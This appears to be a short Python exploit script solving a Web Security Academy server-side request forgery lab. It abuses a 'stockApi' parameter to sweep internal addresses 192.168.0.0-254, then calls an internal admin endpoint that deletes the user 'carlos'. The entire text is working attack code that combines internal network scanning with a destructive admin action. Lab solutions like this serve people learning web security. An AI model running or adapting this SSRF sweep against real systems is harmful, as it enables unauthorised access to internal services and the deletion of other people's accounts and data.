import requests
stock_url = 'https://acee1f9e1e7dd004805c514600d60052.web-security-academy.net/product/stock'

for i in range(0,255):
    ssrf_data = {
        'stockApi' : f'http://192.168.0.{i}:8080/admin/delete?username=carlos'
    }
    resp = requests.post(stock_url, data=ssrf_data)
    if resp.status_code == 200:
        print(f'Admin interface at 192.168.0.{i}')
        break